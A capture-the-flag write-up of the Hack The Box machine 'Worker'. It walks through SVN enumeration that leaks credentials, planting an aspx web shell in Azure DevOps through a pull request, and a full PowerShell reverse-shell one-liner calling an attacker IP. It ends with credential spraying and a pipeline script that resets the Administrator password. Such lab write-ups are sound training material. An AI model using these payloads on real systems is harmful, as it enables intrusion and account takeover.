---
title: "[MEDIUM] HTB-Worker"
draft: false
tags:
  - htb
  - windows
  - azure
  - azure-devops
  - web-shell
  - svn
  - subversion
---
## Information Gathering

### Rustscan

  

Rustscan showed three ports open on TCP: **HTTP**, **SVN**, and **WinRM**.

  

I have never seen port 3690 open before so this definietely was something that I was planning on looking into later.

  

```bash
---..---. .----. .---. .--. .-. .-.
| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \ | `| |
| .-. \| {_} |.-._} } | | .-._} }\ }/ /\ \| |\ |
`-' `-'`-----'`----' `-' `----' `---' `-' `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy :
: https://github.com/RustScan/RustScan :
--------------------------------------
😵 https://admin.tryhackme.com
<snip>
Host is up, received syn-ack (0.33s latency).
Scanned at 2024-03-21 00:09:30 EDT for 0s  

PORT STATE SERVICE REASON
80/tcp open http syn-ack
3690/tcp open svn syn-ack
5985/tcp open wsman syn-ack
  
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.82 seconds
```

  

### Nmap

  

I ran nmap default script scan and found out **Subversion** is running on port 3690.

  

`sudo nmap -sVC -p 80,3690,5985 -v -oN scv-80-3690-5985.nmap 10.10.10.203`

  

```bash
┌──(yoon㉿kali)-[~/Documents/htb/worker]
└─$ sudo nmap -sVC -p 80,3690,5985 -v -oN scv-80-3690-5985.nmap 10.10.10.203
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-21 00:10 EDT
<snip>>
Nmap scan report for 10.10.10.203
Host is up (0.31s latency).

PORT STATE SERVICE VERSION
80/tcp open http Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
| Supported Methods: OPTIONS TRACE GET HEAD POST
|_ Potentially risky methods: TRACE
3690/tcp open svnserve Subversion
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
<snip>
```

  

From some googling I found out that **Subversion** is like a central version control system for managing past and present projects. So from my understanding, it is like GitHub which is used for version control.

  

Hacktricks defines it as:

  

> Subversion is a centralized version control system that plays a crucial role in managing both the present and historical data of projects. Being an open source tool, it operates under the Apache license. This system is widely acknowledged for its capabilities in software versioning and revision control, ensuring that users can keep track of changes over time efficiently.

  
  

## Enumeration


### HTTP - TCP 80

  

Accessing target machine through web browser, I just see default IIS 10.0 web page:

  

![](https://i.imgur.com/wbCEX4o.png)


  

#### Directory Bruteforce

  

I tried Directory Bruteforcing using **Feroxbuster** and wordlist that is specfically generated for IIS but nothing really showed up:

  

`sudo feroxbuster -u http://10.10.10.203 -n -x asp,apsx,config -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt -C 404 -o nx-asp-aspx-config-iis-fuzz.ferox`

  

![](https://i.imgur.com/7WxY6t9.png)


  

Since nothing showed up on HTTP, I moved on to enumerating **subversion**.

  
  

### Subversion - TCP 3690

  

When I encounter ports that I am not familiar with, I always like to use **[Hacktricks](https://book.hacktricks.xyz/)** to follow it's methodology.

  

Since I have never pentested subversion before, I followed [this article](https://book.hacktricks.xyz/network-services-pentesting/3690-pentesting-subversion-svn-server) from hacktricks.

  
  

I first listed the contents in the most recent version of subversion repository -> **dimension.worker.htb**, **moved.txt** was found.




Before downloading what is in there, I first added **dimension.worker.htb** to /etc/hosts to be examined later.

  

`svn ls svn://10.10.10.203`

  

![](https://i.imgur.com/iT81Z34.png)

  

I also queried commit history of subversion and it showed the author(**nathen**) and other bunch of information:

  

- Deployment script is included in Version 2.

- Repository was moved to new Devops Repository in Version 4 commit.

- Note saying that repository has been moved is in Version 5 commit.

  
  

`svn log svn://10.10.10.203`

  

![](https://i.imgur.com/Fb7wxtn.png)


  

Based on the commit history above, I was expecting to see a note saying that current repository has been moved to Devops repository, when with the current version downloaded.

  

To verify, I downloaded current version of the repository with the command below:

  

`svn checkout svn://10.10.10.203`

  

![](https://i.imgur.com/UJaizPs.png)


  

Since Version 5 is the most recent, svn downloaded revision 5 of **dimension.worker.htb** and **moved.txt**(must be note about repo migration!)

  

![](https://i.imgur.com/ssgiGZn.png)


  

Reading **moved.txt**, it confirmed that repository has been moved to **devops.worker.htb** which I added to /etc/hosts file:

  

`cat moved.txt`

  

![](https://i.imgur.com/85qW65I.png)


  

Now remembering there being a deployment script in Version 2, I downloaded it locally:

  

`svn up -r 2`

  

![](https://i.imgur.com/eQChpb9.png)


  
  

Looking at downloaded **deplyment.ps1** script, I was able to obtain credentials for nathen -> **nathen:wendel98**

  

![](https://i.imgur.com/HO4S0Ck.png)


  

Since WinRM is open, I tried evil-winrm with the discovered creds but it didn't work.

  

### dimension.worker.htb 

  

Before checking out on **devops.worker.htb**, I first decided to enumerate on **dimension.worker.htb** since it was discovered first.

  

Going to **dimension.worker.htb**, it showed a webpage which had four sublinks:

- intro
- work
- about
- contact

  

![](https://i.imgur.com/pSqKBED.png)


  

#### dimension.worker.htb/#work

  

Out of above four sublinks, **work** had something interesting.

  

It was linked to couple more subdomain addresses:

- alpha.worker.htb
- cartoon.worker.htb
- lens.worker.htb
- solid-state.worker.htb
- spectral.worker.htb
- story.worker.htb

  

![](https://i.imgur.com/nGRf0uj.png)


  

I added all above discovered subdomains to /etc/hosts and spend good amount of time on each of them, enumerating.

  

Unfortunately, all of them just seemed like default version of HTML5 templates and had nothing useful on it.

  

I decided to move on to **devops.worker.htb** first and if there is no success with it, I can come back to directory bruteforce.

  

### devops.worker.htb

  

Accessing devops.worker.htb through browser, it asked me for credentials and using the creds found above, I was able to signin:

  

![](https://i.imgur.com/ry1VGLB.png)


  

When signed in, it led me to **/ekenas** which seemed to be **Azure DevOps**:

  

![](https://i.imgur.com/LQK9GJU.png)


  

## Shell as iis apppool

  
  

Going to Repos -> Files, I can list bunch of repositories that I previously found as subdomains:

  

![](https://i.imgur.com/x3yumq3.png)


  

Going to **Pipelineas**, I see each for all the repos and it seemed that it is writing the changes to **W:\sites** folder:

  

![](https://i.imgur.com/Y5fDx48.png)



  
  

Looking around, trying to understand the application better, I realized Azure Devops is very similar to Github and using this, I would be able to upload a webshell and get a reverse shell connection.

  

I tried adding random file to any of the master branch but it didn't work-> It seemed that I will need to create a new branch on my own, make changes it to it, and pull it to the master branch for it to work.

  

![](https://i.imgur.com/mFreeZn.png)


  

Below are the steps that I took to get a reverse shell connection:

  

1. Create a new branch.

2. Upload **cmd.aspx** to the new branch.

3. Make a pull request from the new branch to the master branch.

4. Access cmd.aspx from the browser and make a reverse shell conneciton.

  

### 1: Create New Branch

  

I just randomly chose any repository: **alpha**.

  

Created a new branch called **jadu-branch**:

  

![](https://i.imgur.com/1USNSki.png)


  
  

### 2: Upload cmd.aspx

  

Added cmd.aspx to jadu-branch as such:

  



  

![](https://i.imgur.com/HTzzbOH.png)

*Make sure to add work items to link*

  

### 3: Make Pull request

  

Now you will see cmd.aspx uploaded to jadu-branch.

  
  
  
  

![](https://i.imgur.com/yp6c6Ld.png)


  

Click on create a pull request:

  

![](https://i.imgur.com/OZeHkqa.png)


  

Now by clicking on Approve -> Complete:

  

![](https://i.imgur.com/VwY3Vy5.png)


  

Now I can access cmd.aspx on web browser

  

### 4: cmd.aspx to reverse shell

  

I can see it works throgh `whoami`:

  

![](https://i.imgur.com/t5wnx8o.png)


  

Using [this payload generator](https://podalirius.net/en/articles/windows-reverse-shells-cheatsheet/):

  

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',9001);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

  

![](https://i.imgur.com/t98WYJj.png)


  

Now I have shell as **IIS apppool**.

  

## Privesc: iis apppool to robidl

### Drive W:\

Remembering that Pipeline script saves changes to W:\Sites from earlier enumeration:

  

![](https://i.imgur.com/X6D4YbD.png)


  

Changed drive to W:\

  
  

![](https://i.imgur.com/BGvjaXp.png)


  

On **/sites**, I see bunch of sites that I've seen earlier:

  

![](https://i.imgur.com/7TmcRdZ.png)


  

On **W:\svnrepos\www**, conf directory seemed interesting:

  

![](https://i.imgur.com/oCjBwzX.png)


  

Inside of it I saw **passwd** file:

  

![](https://i.imgur.com/4aOJCwm.png)


  

**passwd** file had bunch of credentials in it:

![](https://i.imgur.com/rVtYv69.png)


### Creds Spraying

  


  

I copied the file to local Kali machine as **user-password.txt**:

  

![](https://i.imgur.com/qYoQYF5.png)


  

Using the commands below, I created two files, each for **usernames** and **password**:

  
  

`awk -F ' = ' '{print $1}' user-password.txt > usernames.txt`

  

`sudo awk -F ' = ' '{print $2}' user-password.txt > passwords.txt`

  

Running Crackmapexec for credentials spraying on winrm, I found valid match: **robisl:wolves11**

  

`crackmapexec winrm 10.10.10.203 -u usernames.txt -p passwords.txt --no-brute --continue-on-success`

  

![](https://i.imgur.com/KPaPkwb.png)


  



  

![](https://i.imgur.com/0ls0cvb.png)


  
  

### Evil-Winrm

  

Now I obtained WinRM connection as user **robisl**:

  

![](https://i.imgur.com/cIdU5Pu.png)


  
  

## Privesc: robisl to Administrator

  
I followed my Privilege Escalation methodology to escalate my privilege from robsil to Administrator but it seemed not doable from shell connection. 

I decided to check if user **robsil** has account on **Azure Devops** and luckily I was able to sign in:


![](https://i.imgur.com/RXyirAL.png)


  
  
It showed me a similar page but this time it had a project names **PartsUnlimited**:
  
  

![](https://i.imgur.com/p0jUxYh.png)


Looking around Project Settings, I found out User **robisl** is in group **Build Administrator**:


  

![](https://i.imgur.com/ivcfwF5.png)


**Build Administrators** group can define group builds with CI and other pipeline related tasks.

## Create Pipeline

I first created a new pipeline, selecting **Azure Repos Git** from the list:

![](https://i.imgur.com/TqBXEeJ.png)


Next, I chose **PartsUnlimited** as it is the only repo:
  

![](https://i.imgur.com/4aIWd3I.png)

On next step, I chose **Starter Pipeline** from configuration options since it seemed the most simple:

  

![](https://i.imgur.com/4mk2Vcv.png)


Now I will see if I can upload a new pipeline YAML:
  

![](https://i.imgur.com/38XvSCb.png)

I tried commiting the change to master branch by clicking on Save and Run:


![](https://i.imgur.com/GIUqIdy.png)


However, as expected, it was requiring me for a new branch and a merge later:


![](https://i.imgur.com/sATIIRz.png)


  

From some research, I found out a way to exploit this feature. 


I removed the line for the **pool**, and added a script that would change the password for Administrator:

`net user Administrator Password1`

![](https://i.imgur.com/u9TKBJp.png)


Before running this change, I created a new branch so I can later merge it to master branch:

![](https://i.imgur.com/8QaewHN.png)


Clicking on **Save and Run**, I can see that everything is being setup:
  

![](https://i.imgur.com/xb0FKvh.png)


  

## Evil-Winrm

Now I can sign it to the system as Administrator with the password that I set:

![](https://i.imgur.com/YKToj7m.png)



## References
- https://www.legitsecurity.com/blog/remote-code-execution-vulnerability-in-azure-pipelines-can-lead-to-software-supply-chain-attack